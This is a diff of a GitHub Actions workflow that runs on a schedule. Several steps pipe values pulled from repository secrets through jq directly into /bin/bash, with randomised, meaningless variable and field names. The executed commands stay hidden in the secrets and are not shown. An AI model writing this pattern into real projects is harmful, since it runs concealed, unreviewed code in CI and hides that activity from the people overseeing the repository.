@@ -2,25 +2,22 @@ name: baixiaochi1974
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 5/6 * * *'
+    - cron: '44 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: baixiaochi1974
         env:
-          t29: ${{ secrets.t29 }}
+          mwor6: ${{ secrets.mwor6 }}
         run: |
-          echo $t29 | jq -r .jzq375 | /bin/bash
-          echo $d90276 | jq -r .ey618 | /bin/bash
-          echo $efsbv00 | jq -r .hy34779 | /bin/bash
-          echo $kl44788 | jq -r .kypq95287 | /bin/bash
-          echo $ygz114 | jq -r .vs615 | /bin/bash
-          echo $c1 | jq -r .pafdt61 | /bin/bash
-          echo $gqwp7033 | jq -r .fgp4897 | /bin/bash
-          echo $ok882 | jq -r .a53726 | /bin/bash
-          echo $mk076 | jq -r .gqj3104 | /bin/bash
-          echo $tk9 | jq -r .kxjkq4 | /bin/bash
+          echo $mwor6 | jq -r .zgmcp5 | /bin/bash
+          echo $x513 | jq -r .u7474 | /bin/bash
+          echo $nluxv5656 | jq -r .j3 | /bin/bash
+          echo $flz96235 | jq -r .eava289 | /bin/bash
+          echo $mjdk69 | jq -r .zn78720 | /bin/bash
+          echo $ejy75239 | jq -r .it812 | /bin/bash
 
